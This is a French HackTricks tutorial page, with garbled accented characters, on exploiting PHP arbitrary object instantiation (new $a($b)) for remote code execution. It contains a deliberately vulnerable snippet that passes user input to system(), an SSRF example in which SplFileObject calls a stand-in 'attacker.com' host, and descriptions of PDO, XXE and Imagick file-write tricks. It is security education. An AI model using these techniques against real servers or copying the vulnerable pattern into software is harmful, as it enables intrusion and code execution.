# PHP - Exploitation de RCE par cr√©ation d'objet : new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introduction

Dans la situation o√π vous pouvez cr√©er un nouvel objet arbitraire comme `new $_GET["a"]($_GET["a"])`, vous pourriez √™tre capable d'obtenir un RCE, et [**ce writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) expose diff√©rentes mani√®res d'obtenir un RCE.

## RCE via Classes Personnalis√©es ou Autoloading

Dans la construction `new $a($b)`, la **variable `$a` repr√©sente le nom de la classe** pour laquelle l'objet sera cr√©√©, et la variable **`$b` repr√©sente le premier argument** qui sera pass√© au constructeur de l'objet.

Si `$a` et `$b` proviennent de GET/POST, ils peuvent √™tre des **cha√Ænes de caract√®res ou des tableaux de cha√Ænes**. S'ils proviennent de **JSON** ou d'ailleurs, ils **pourraient avoir d'autres types**, tels que objet ou bool√©en.

Consid√©rons l'exemple suivant :
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Dans ce code, vous pouvez d√©finir `$a` √† `App` ou `App2` et `$b` √† `uname -a`. Apr√®s cela, la commande `uname -a` sera ex√©cut√©e.

Lorsqu'il n'y a pas de telles classes exploitables dans votre application, ou que vous avez la classe n√©cessaire dans un fichier s√©par√© qui n'est pas inclus par le code vuln√©rable, vous pouvez examiner les fonctions d'autochargement.

**Les fonctions d'autochargement** sont d√©finies en enregistrant des rappels via `spl_autoload_register` ou en d√©finissant `__autoload`. Elles sont appel√©es lorsqu'une instance d'une classe inconnue essaie d'√™tre cr√©√©e.
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
Selon la version de PHP et le code dans les fonctions d'autochargement, certaines m√©thodes pour obtenir une ex√©cution de code √† distance via l'autochargement pourraient exister.

## RCE via les classes int√©gr√©es

Lorsque vous n'avez pas de classes personnalis√©es et d'autochargement, vous pouvez vous reposer uniquement sur **les classes PHP int√©gr√©es**.

Il existe de 100 √† 200 classes PHP int√©gr√©es. Leur nombre d√©pend de la version de PHP et des extensions install√©es. Toutes les classes int√©gr√©es peuvent √™tre list√©es via la fonction `get_declared_classes`, en m√™me temps que les classes personnalis√©es :
```php
var_dump(get_declared_classes());
```
Les classes avec des constructeurs utiles peuvent √™tre trouv√©es via [l'API de r√©flexion](https://www.php.net/manual/fr/book.reflection.php).

Affichage des constructeurs et de leurs param√®tres en utilisant l'API de r√©flexion : [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

Si vous contr√¥lez **plusieurs param√®tres du constructeur et pouvez appeler des m√©thodes arbitraires** par la suite, il existe de nombreuses fa√ßons d'obtenir une ex√©cution de code √† distance (Remote Code Execution). Mais si vous pouvez passer **un seul param√®tre et n'avez aucun appel** √† l'objet cr√©√©, il y a **presque rien**.

Je ne connais que trois fa√ßons d'obtenir quelque chose de `new $a($b)`.

### **SSRF + D√©s√©rialisation Phar**

La classe `SplFileObject` impl√©mente un constructeur qui permet de se connecter √† n'importe quelle URL locale ou distante :
```
new SplFileObject('http://attacker.com/');
```
Cela permet le SSRF. De plus, les SSRF dans PHP < 8.0 pourraient √™tre transform√©s en d√©s√©rialisations via des techniques avec le protocole Phar.

### **Exploitation des PDOs**

La classe PDO a un autre constructeur int√©ressant :
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Dans PHP ‚â§ 5.3.22 et ‚â§ 5.4.12, le constructeur de SoapClient √©tait **vuln√©rable aux XXE**. Le constructeur de SimpleXMLElement √©tait √©galement vuln√©rable aux XXE, mais n√©cessitait libxml2 < 2.9.

## RCE via l'extension Imagick

En v√©rifiant les **d√©pendances** du **projet** que vous essayez d'exploiter, vous pourriez trouver **de nouvelles classes** qui pourraient √™tre **abus√©es pour ex√©cuter des commandes** en cr√©ant un nouvel objet. Dans ce cas, **Imagick** s'est av√©r√© utile √† cette fin.

### Analyseur VID

L'analyseur VID permet d'√©crire un contenu arbitraire dans un chemin arbitraire √† l'int√©rieur du syst√®me de fichiers, ce qui permettrait √† un attaquant d'√©crire un PHPshell dans un dossier accessible depuis la page web et d'obtenir un RCE.

![](<../../../.gitbook/assets/image (157) (3).png>)

#### Analyseur VID + T√©l√©versement de Fichier

Lorsqu'un fichier est t√©l√©vers√© sur PHP, il est temporairement stock√© dans `/tmp/phpXXXXXX`. L'analyseur VID d'Imagick avec le protocole **msl** permet de **sp√©cifier des jokers dans les chemins de fichiers** (de sorte que le fichier t√©l√©vers√© temporairement puisse √™tre facilement acc√©d√©) et de **le copier dans un emplacement arbitraire**.\
C'est une autre mani√®re d'obtenir une √©criture de fichier arbitraire √† l'int√©rieur du syst√®me de fichiers :

![](<../../../.gitbook/assets/image (159).png>)

### Plantage PHP + Force Brute

Le [**rapport original**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) expliquait une autre mani√®re d'obtenir un RCE en **t√©l√©versant des fichiers avec un contenu sp√©cifique** et en faisant **planter le serveur avant qu'il ne supprime** ce fichier, puis en **brutefor√ßant le nom** du fichier temporaire jusqu'√† ce qu'**Imagick ex√©cute du code PHP arbitraire**.

Cependant, apparemment, l'astuce du **plantage** d√©couverte ne **fonctionnait que dans une ancienne version d'ImageMagick**.

## R√©f√©rences

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
